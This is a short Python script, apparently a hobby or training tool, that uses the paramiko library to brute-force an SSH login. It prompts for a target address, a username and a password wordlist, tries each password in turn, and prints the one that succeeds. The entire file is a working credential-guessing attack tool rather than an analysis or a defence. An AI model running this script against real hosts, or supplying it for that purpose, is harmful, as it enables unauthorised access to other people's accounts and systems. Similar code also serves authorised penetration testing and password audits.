import paramiko
from termcolor import colored

def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target_ip, port=22, username=target_usr, password=password)
    except paramiko.AuthenticationException:
        # Authenticating is popping an exception, wrong credentials
        code = 1
    except paramiko.SSHException as sshException:
        # The remote machine is unavailable
        code = 2
        
    ssh.close()
    return code

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

target_ip = input('[*] Target Address: ')
target_usr = input('[*] SSH Username: ')
# Word list of potential passwords
pwdfile = input('[*] Passwords Filename: \n')

print('\n')

# File handling and launching algorithm
with open(pwdfile, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            # Check the password
            response = ssh_connect(password)
            if response == 0:
                print(colored(('[*] Found Password: ' + password +  
                                ' , For Username: ' + target_usr), 'green'))
                # Found the correct password, breaking the loop
                break
            elif response == 1:
                print(('[*] Incorrect Password: ' + password))
            elif response == 2:
                print('Check the IP or the username')
                break
        except Exception as e:
            print(colored(e, 'red'))
            pass
